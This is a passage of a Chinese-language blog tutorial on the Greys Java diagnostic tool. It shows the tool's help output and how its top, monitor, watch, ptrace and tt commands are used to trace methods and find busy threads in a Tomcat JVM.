-H ./greys.sh  3292</span><br></pre></td></tr></table></figure><p>为了安全考虑，一般会限制tomcat启动用户的权限，这里<code>-u</code>指定了<code>tomcat</code>启动的用户， <code>3292</code>是tomcat的进程id。<br>交互式shell，输入help即可看到所有支持的命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;help</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|       sc | Search all the classes loaded by JVM                                             |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|       sm | Search the method of classes loaded by JVM                                       |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|  monitor | Monitor the execution of specified Class and its method                          |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|    watch | Display the details of specified class and method                                |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|       tt | Time Tunnel                                                                      |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|    trace | Display the detailed thread stack of specified class and method                  |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|       js | Enhanced JavaScript                                                              |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|   ptrace | Display the detailed thread path stack of specified class and method             |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|    stack | Display the stack trace of specified class and method                            |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|     quit | Quit Greys console                                                               |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|  session | Display current session information                                              |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|  version | Display Greys version                                                            |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|      jvm | Display the target JVM information                                               |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|    reset | Reset all the enhanced classes                                                   |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|      asm | Display class bytecode by asm format                                             |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">| shutdown | Shut down Greys server and exit the console                                      |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|     help | Display Greys Help                                                               |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|      top | Display The Threads Of Top CPU TIME                                              |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure><p>help后面可以跟具体的命令， 会显示命令的具体用法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;help tt</span><br><span class="line">+---------+----------------------------------------------------------------------------------+</span><br><span class="line">|   USAGE | -[tlDi:x:w:s:pdEn:] class-pattern method-pattern condition-express               |</span><br><span class="line">|         | Time Tunnel                                                                      |</span><br><span class="line">+---------+----------------------------------------------------------------------------------+</span><br><span class="line">| OPTIONS |              [t] | Record the method invocation within time fragments            |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |              [l] | List all the time fragments                                   |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |              [D] | Delete all the time fragments                                 |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |             [i:] | Display the detailed information from specified time fragmen  |</span><br><span class="line">|         |                  | t                                                             |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |             [x:] | Expand level of object (0 by default)                         |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |             [w:] | watch-express, watch the time fragment by OGNL express, like  |</span><br><span class="line">|         |                  |  params[0], returnObj, throwExp and so on.                    |</span><br><span class="line">|         |                  |                                                               |</span><br><span class="line">|         |                  | FOR EXAMPLE                                                   |</span><br><span class="line">|         |                  |     params[0]                                                 |</span><br><span class="line">|         |                  |     params[0]+params[1]                                       |</span><br><span class="line">|         |                  |     returnObj                                                 |</span><br><span class="line">|         |                  |     throwExp                                                  |</span><br><span class="line">|         |                  |     target                                                    |</span><br><span class="line">|         |                  |     clazz                                                     |</span><br><span class="line">|         |                  |     method                                                    |</span><br><span class="line">|         |                  |                                                               |</span><br><span class="line">|         |                  | THE STRUCTURE                                                 |</span><br><span class="line">|         |                  |           target : the object                                 |</span><br><span class="line">|         |                  |            clazz : the object&apos;s class                         |</span><br><span class="line">|         |                  |           method : the constructor or method                  |</span><br><span class="line">|         |                  |     params[0..n] : the parameters of method                   |</span><br><span class="line">|         |                  |        returnObj : the returned object of method              |</span><br><span class="line">|         |                  |         throwExp : the throw exception of method              |</span><br><span class="line">|         |                  |         isReturn : the method ended by return                 |</span><br><span class="line">|         |                  |          isThrow : the method ended by throwing exception     |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |             [s:] | Search-expression, to search the time fragments by OGNL expr  |</span><br><span class="line">|         |                  | ess                                                           |</span><br><span class="line">|         |                  |                                                               |</span><br><span class="line">|         |                  | FOR EXAMPLE                                                   |</span><br><span class="line">|         |                  |      TRUE : 1==1                                              |</span><br><span class="line">|         |                  |      TRUE : true                                              |</span><br><span class="line">|         |                  |     FALSE : false                                             |</span><br><span class="line">|         |                  |      TRUE : params.length&gt;=0                                  |</span><br><span class="line">|         |                  |     FALSE : 1==2                                              |</span><br><span class="line">|         |                  |                                                               |</span><br><span class="line">|         |                  | THE STRUCTURE                                                 |</span><br><span class="line">|         |                  |           target : the object                                 |</span><br><span class="line">|         |                  |            clazz : the object&apos;s class                         |</span><br><span class="line">|         |                  |           method : the constructor or method                  |</span><br><span class="line">|         |                  |     params[0..n] : the parameters of method                   |</span><br><span class="line">|         |                  |        returnObj : the returned object of method              |</span><br><span class="line">|         |                  |         throwExp : the throw exception of method              |</span><br><span class="line">|         |                  |         isReturn : the method ended by return                 |</span><br><span class="line">|         |                  |          isThrow : the method ended by throwing exception     |</span><br><span class="line">|         |                  |           #index : the index of time-fragment record          |</span><br><span class="line">|         |                  |       #processId : the process ID of time-fragment record     |</span><br><span class="line">|         |                  |            #cost : the cost time of time-fragment record      |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |              [p] | Replay the time fragment specified by index                   |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |              [d] | Delete time fragment specified by index                       |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |              [E] | Enable regular expression to match (wildcard matching by def  |</span><br><span class="line">|         |                  | ault)                                                         |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |             [n:] | Threshold of execution times                                  |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |    class-pattern | Path and classname of Pattern Matching                        |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |   method-pattern | Method of Pattern Matching                                    |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |  condition-expre | Conditional expression by OGNL                                |</span><br><span class="line">|         |               ss |                                                               |</span><br><span class="line">|         |                  | FOR EXAMPLE                                                   |</span><br><span class="line">|         |                  |      TRUE : 1==1                                              |</span><br><span class="line">|         |                  |      TRUE : true                                              |</span><br><span class="line">|         |                  |     FALSE : false                                             |</span><br><span class="line">|         |                  |      TRUE : params.length&gt;=0                                  |</span><br><span class="line">|         |                  |     FALSE : 1==2                                              |</span><br><span class="line">|         |                  |                                                               |</span><br><span class="line">|         |                  | THE STRUCTURE                                                 |</span><br><span class="line">|         |                  |           target : the object                                 |</span><br><span class="line">|         |                  |            clazz : the object&apos;s class                         |</span><br><span class="line">|         |                  |           method : the constructor or method                  |</span><br><span class="line">|         |                  |     params[0..n] : the parameters of method                   |</span><br><span class="line">|         |                  |        returnObj : the returned object of method              |</span><br><span class="line">|         |                  |         throwExp : the throw exception of method              |</span><br><span class="line">|         |                  |         isReturn : the method ended by return                 |</span><br><span class="line">|         |                  |          isThrow : the method ended by throwing exception     |</span><br><span class="line">|         |                  |            #cost : the cost(ms) of method                     |</span><br><span class="line">+---------+----------------------------------------------------------------------------------+</span><br><span class="line">| EXAMPLE | tt -t *StringUtils isTop                                                         |</span><br><span class="line">|         | tt -t *StringUtils isTop params[0].length==1                                     |</span><br><span class="line">|         | tt -l                                                                            |</span><br><span class="line">|         | tt -D                                                                            |</span><br><span class="line">|         | tt -i 1000 -w params[0]                                                          |</span><br><span class="line">|         | tt -i 1000 -d                                                                    |</span><br><span class="line">|         | tt -i 1000                                                                       |</span><br><span class="line">+---------+----------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure><h4 id="top"><a href="#top" class="headerlink" title="top"></a>top</h4><p>greys的shell里集成的top功能，可以显示jstack中每个线程的cpu占比。</p><p>没有greys的时候的做法可能是，先查看native的线程的cpu占用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top -p 3292 -H</span><br></pre></td></tr></table></figure><p><code>-H</code>是显示到线程级别</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Tasks: 699 total,   0 running, 699 sleeping,   0 stopped,   0 zombie</span><br><span class="line">Cpu(s):  8.0%us,  1.6%sy,  0.0%ni, 90.2%id,  0.0%wa,  0.0%hi,  0.2%si,  0.1%st</span><br><span class="line">Mem:   8059648k total,  7801008k used,   258640k free,    33328k buffers</span><br><span class="line">Swap:  4194296k total,        0k used,  4194296k free,  2453588k cached</span><br><span class="line"></span><br><span class="line">  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND                                                                            </span><br><span class="line"> 5620 tomcat    20   0 9446m 4.2g 6696 S  6.6 54.2  33:46.86 java                                                                               </span><br><span class="line"> 5764 tomcat    20   0 9446m 4.2g 6696 S  5.0 54.2   1:05.94 java                                                                               </span><br><span class="line"> 5787 tomcat    20   0 9446m 4.2g 6696 S  4.0 54.2  57:48.76 java                                                                               </span><br><span class="line"> 5790 tomcat    20   0 9446m 4.2g 6696 S  2.3 54.2  40:31.71 java                                                                               </span><br><span class="line"> 3523 tomcat    20   0 9446m 4.2g 6696 S  1.3 54.2  68:48.18 java                                                                               </span><br><span class="line"> 3982 tomcat    20   0 9446m 4.2g 6696 S  1.3 54.2  21:15.22 java                                                                               </span><br><span class="line"> 3385 tomcat    20   0 9446m 4.2g 6696 S  1.0 54.2  54:10.76 java                                                                               </span><br><span class="line"> 3413 tomcat    20   0 9446m 4.2g 6696 S  1.0 54.2  29:12.64 java</span><br></pre></td></tr></table></figure><p>由于jstack的输出是16进制的线程号，我们需要根据<code>PID</code>进行转换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf &quot;%x\n&quot; 5620</span><br><span class="line">15f4</span><br></pre></td></tr></table></figure><p>然后<code>jstack</code>去查找相应的java线程栈</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&quot;http-8080-38&quot; daemon prio=10 tid=0x00007fbcf006e000 nid=0x15f4 in Object.wait() [0x00007fbcd28a1000]</span><br><span class="line">   java.lang.Thread.State: WAITING (on object monitor)</span><br><span class="line">        at java.lang.Object.wait(Native Method)</span><br><span class="line">        - waiting on &lt;0x000000077b69e488&gt; (a org.apache.tomcat.util.net.JIoEndpoint$Worker)</span><br><span class="line">        at java.lang.Object.wait(Object.java:503)</span><br><span class="line">        at org.apache.tomcat.util.net.JIoEndpoint$Worker.await(JIoEndpoint.java:458)</span><br><span class="line">        - locked &lt;0x000000077b69e488&gt; (a org.apache.tomcat.util.net.JIoEndpoint$Worker)</span><br><span class="line">        at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:484)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:744)</span><br></pre></td></tr></table></figure><p>费了一番功夫，黄花菜都凉了。</p><p>也有将上面的步骤写成一个脚本的，快了许多。（驼厂内部散落着各种不同版本的slow_stack.sh）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">The stack of busy(13.6%) thread(3613/0xe1d) of java pid(3292) all times():</span><br><span class="line">&quot;http-8080-13&quot; daemon prio=10 tid=0x00007fbcf001b000 nid=0xe1d in Object.wait() [0x00007fbce7f7e000]</span><br><span class="line">   java.lang.Thread.State: WAITING (on object monitor)</span><br><span class="line">        at java.lang.Object.wait(Native Method)</span><br><span class="line">        - waiting on &lt;0x0000000771e29738&gt; (a org.apache.tomcat.util.net.JIoEndpoint$Worker)</span><br><span class="line">        at java.lang.Object.wait(Object.java:503)</span><br><span class="line">        at org.apache.tomcat.util.net.JIoEndpoint$Worker.await(JIoEndpoint.java:458)</span><br><span class="line">        - locked &lt;0x0000000771e29738&gt; (a org.apache.tomcat.util.net.JIoEndpoint$Worker)</span><br><span class="line">        at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:484)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:744)</span><br></pre></td></tr></table></figure><p>开源的版本也有， <a href="https://github.com/superhj1987/awesome-scripts/blob/master/docs/java.md#beer-show-busy-java-threads" rel="external nofollow noopener noreferrer" target="_blank">awesome-scripts/java.md at master · superhj1987/awesome-scripts</a></p><p>greys中就可以直接使用top命令来查看，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;top -t 3 -d</span><br><span class="line">+-------+--------+---------------+----------------------+---------------------------------------------------------------------------------------+</span><br><span class="line">| ID    |  CPU%  | USR%          | STATE                | THREAD_NAME                                                                           |</span><br><span class="line">+-------+--------+---------------+----------------------+---------------------------------------------------------------------------------------+</span><br><span class="line">| #131  | 04.14% | TIMED_WAITING | CachedClock Updater  | at : sun.misc.Unsafe.park(Native Method)                                              |</span><br><span class="line">|       |        |               | Thread               | at : java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:349)           |</span><br><span class="line">|       |        |               |                      | at : qunar.tc.common.clock.CachedClock$1.run(CachedClock.java:22)                     |</span><br><span class="line">|       |        |               |                      | at : java.lang.Thread.run(Thread.java:744)                                            |</span><br><span class="line">+-------+--------+---------------+----------------------+---------------------------------------------------------------------------------------+</span><br><span class="line">| #1282 | 03.51% | WAITING       | http-8080-176        | at : java.lang.Object.wait(Native Method)                                             |</span><br><span class="line">|       |        |               |                      | at : java.lang.Object.wait(Object.java:503)                                           |</span><br><span class="line">|       |        |               |                      | at : org.apache.tomcat.util.net.JIoEndpoint$Worker.await(JIoEndpoint.java:458)        |</span><br><span class="line">|       |        |               |                      | at : org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:484)          |</span><br><span class="line">|       |        |               |                      | at : java.lang.Thread.run(Thread.java:744)                                            |</span><br><span class="line">+-------+--------+---------------+----------------------+---------------------------------------------------------------------------------------+</span><br><span class="line">| #38   | 03.26% | TIMED_WAITING | thread-monitor-task  | at : sun.misc.Unsafe.park(Native Method)                                              |</span><br><span class="line">|       |        |               |                      | at : java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:226)           |</span><br><span class="line">|       |        |               |                      | at : java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos |</span><br><span class="line">|       |        |               |                      |      (AbstractQueuedSynchronizer.java:2082)                                           |</span><br><span class="line">|       |        |               |                      | at : java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(Scheduled |</span><br><span class="line">|       |        |               |                      |      ThreadPoolExecutor.java:1090)                                                    |</span><br><span class="line">|       |        |               |                      | at : java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(Scheduled |</span><br><span class="line">|       |        |               |                      |      ThreadPoolExecutor.java:807)                                                     |</span><br><span class="line">|       |        |               |                      | at : java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1068)    |</span><br><span class="line">|       |        |               |                      | at : java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130)  |</span><br><span class="line">|       |        |               |                      | at : java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)  |</span><br><span class="line">|       |        |               |                      | at : java.lang.Thread.run(Thread.java:744)                                            |</span><br><span class="line">+-------+--------+---------------+----------------------+---------------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure><p>上面显示的就是top3占用cpu的线程</p><h4 id="monitor-——-监控方法的执行时间"><a href="#monitor-——-监控方法的执行时间" class="headerlink" title="monitor —— 监控方法的执行时间"></a>monitor —— 监控方法的执行时间</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;monitor -c2 com.domain.Bean   someMethod   </span><br><span class="line">Press Ctrl+D to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:1) cost in 103 ms.</span><br><span class="line">+---------------------+--------------------+----------------------------+-------+---------+------+-----------+------------+------------+------------+</span><br><span class="line">| TIMESTAMP           | CLASS              | METHOD                     | TOTAL | SUCCESS | FAIL | FAIL-RATE | AVG-RT(ms) | MIN-RT(ms) | MAX-RT(ms) |</span><br><span class="line">+---------------------+--------------------+----------------------------+-------+---------+------+-----------+------------+------------+------------+</span><br><span class="line">| 2017-11-12 17:09:18 | com.domain.Bean    | someMethod                 | 4     | 4       | 0    | 00.00%    | 13.25      | 11         | 17         |</span><br><span class="line">+---------------------+--------------------+----------------------------+-------+---------+------+-----------+------------+------------+------------+</span><br></pre></td></tr></table></figure><h4 id="watch-——-全方位监控"><a href="#watch-——-全方位监控" class="headerlink" title="watch —— 全方位监控"></a>watch —— 全方位监控</h4><p>watch可以监控方法的返回值，入参，还可以根据条件筛选（是否抛出异常，响应时间等）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;watch com.domain.Bean onMessage params[0]</span><br><span class="line">Press Ctrl+D to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:1) cost in 92 ms.</span><br><span class="line">&#123;&quot;messageId&quot;:&quot;171112.171542.192.168.50.191.31779.22733&quot;&#125;</span><br></pre></td></tr></table></figure><h4 id="tt（time-tunel）和ptrace"><a href="#tt（time-tunel）和ptrace" class="headerlink" title="tt（time tunel）和ptrace"></a>tt（time tunel）和ptrace</h4><p>先说ptrace， 这个和trace差不多， 只是可以加上<code>-t</code>将调用存储起来，可以配合<code>tt</code>使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;ptrace -t  -n 1 com.domain.Bean doSend</span><br><span class="line">Press Ctrl+D to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:22) cost in 163 ms.</span><br><span class="line">`---+pTracing for : thread_name=&quot;http-8080-179&quot; thread_id=0x505;is_daemon=true;priority=5;process=1002;</span><br><span class="line">    `---[21,21ms]com.domain.Bean:doSend(); index=1001;</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|    INDEX | PROCESS-ID |            TIMESTAMP |   COST(ms) |   IS-RET |   IS-EXP |          OBJECT |                          CLASS |                         METHOD |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1001 |       1002 |  2017-11-12 17:30:40 |         20 |     true |    false |      0x55e9f734 |                           Bean |                         doSend |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br></pre></td></tr></table></figure></p><p><code>tt</code>:</p><blockquote><p>时间隧道命令是我在使用watch命令进行问题排查的时候衍生出来的想法。<br>watch虽然很方便和灵活，但需要提前想清楚观察表达式的拼写，这对排查问题而言要求太高，因为很多时候我们并不清楚问题出自于何方，只能靠蛛丝马迹进行猜测.<br>这个时候如果能记录下当时方法调用的所有入参和返回值、抛出的异常会对整个问题的思考与判断非常有帮助。<br>于是乎，TimeTunnel命令就诞生了。</p></blockquote><p>列出所有时间片段或显示一个时间片段的内容:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tt -l</span><br><span class="line">tt -i 1001</span><br></pre></td></tr></table></figure><p>内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;tt -l</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|    INDEX | PROCESS-ID |            TIMESTAMP |   COST(ms) |   IS-RET |   IS-EXP |          OBJECT |                          CLASS |                         METHOD |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1001 |       1002 |  2017-11-12 17:30:40 |         20 |     true |    false |      0x55e9f734 |                           Bean |                         doSend |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1002 |       1003 |  2017-11-12 17:30:41 |         10 |     true |    false |      0x55e9f734 |                           Bean |                         doSend |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">ga?&gt;tt -i 1001</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|           INDEX | 1001                                                                                                                                                   |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|      PROCESS-ID | 1002                                                                                                                                                   |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|      GMT-CREATE | 2017-11-12 17:30:40                                                                                                                                    |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|        COST(ms) | 20                                                                                                                                                     |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|          OBJECT | 0x55e9f734                                                                                                                                             |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|           CLASS | com.domain.Bean                                                                                 |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|          METHOD | doSend                                                                                                                                                 |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|       IS-RETURN | true                                                                                                                                                   |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|    IS-EXCEPTION | false                                                                                                                                                  |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|   